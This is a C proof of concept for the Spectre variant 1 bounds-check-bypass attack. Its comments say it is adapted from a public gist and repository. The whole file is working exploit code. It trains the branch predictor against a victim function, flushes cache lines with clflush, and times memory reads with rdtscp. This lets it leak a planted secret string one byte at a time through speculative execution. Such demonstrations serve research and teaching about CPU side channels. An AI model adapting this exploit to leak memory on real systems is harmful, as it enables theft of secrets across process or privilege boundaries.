/*
 * From: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 * Via: https://github.com/Eugnis/spectre-attack
 * Edited to fix a small bug; without (hopefully) introducing a new bug...
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h> /* for rdtscp and clflush */

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
char array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
char array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";

char temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
    int test = x < array1_size;  //not really sure if this causes branching or not?
    test &= x >= 0;  //if we don't check this, than negative values either cause
                //an error or we could have just read at those locations, in which
                //case using this program is a needless complexity.
    if (test)
    {
        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
//common practice to use size_t for array addresses, apparently.
void readMemoryByte(size_t malicious_x, char value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile char* addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array2);  //changed so that it flushes array2.  greatly improved operation for me.
            for (volatile int z = 0; z < 100; z++)  //volatile prevents compiler optimization.
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won't get optimized out*/
    value[0] = (char)j;
    score[0] = results[j];
    value[1] = (char)k;
    score[1] = results[k];
}

int main(int argc, const char* * argv)
{
    printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    int score[2], len = strlen(secret);
    char value[2];
    printf("array1 = %p, secret = %p, sizeof(char) = %ld\n", (void *)array1, (void *)secret, sizeof(char));
    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p (= %ld)... ", (void *)malicious_x, (long)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    return (0);
}